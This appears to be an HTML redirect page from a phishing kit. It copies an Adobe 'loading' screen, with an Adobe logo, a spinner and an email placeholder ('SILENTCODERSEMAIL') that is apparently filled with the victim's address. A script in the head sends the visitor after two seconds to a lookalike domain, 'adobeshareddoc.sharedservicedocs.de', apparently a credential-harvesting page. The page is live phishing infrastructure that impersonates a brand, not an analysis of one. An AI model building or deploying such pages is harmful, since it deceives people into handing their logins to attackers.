<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Loading...</title>
    <style>
        /* General Styles */
        body {
            background-color: #640c0c; /* Dark Red */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            margin: 0;
        }

        /* Main Container */
        .container {
            background-color: #ffffff; /* White background */
            padding: 30px;
            border-radius: 15px 15px 15px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }

        /* Logo */
        .logo {
            width: 100px;
            display: block;
        }

        /* Loading Spinner */
        .loader {
            border: 6px solid rgba(0, 0, 0, 0.1);
            border-top: 6px solid rgb(112, 29, 29);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }

        /* Keyframes for Loader Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Email Text */
        .email {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: #000000;
        }

        /* Responsive Fix */
        @media screen and (max-width: 480px) {
            .container {
                padding: 20px;
            }
            .email {
                font-size: 16px;
            }
        }
    </style>

    <script>
        // Redirect to the specified URL after 2 seconds
        setTimeout(function() {
            window.location.href = 'https://adobeshareddoc.sharedservicedocs.de/7ud38';
        }, 2000);
    </script>
</head>
<body>
    <div class="container">
        <!-- Adobe Logo -->
        <img src="https://www.tech-advising.com/wp-content/uploads/adobe-logo.png" class="logo" alt="Adobe Logo">

        <!-- Loading Animation -->
        <div class="loader"></div>

        <!-- Display Email Address -->
        <div class="email">SILENTCODERSEMAIL</div>
    </div>
</body>
</html>
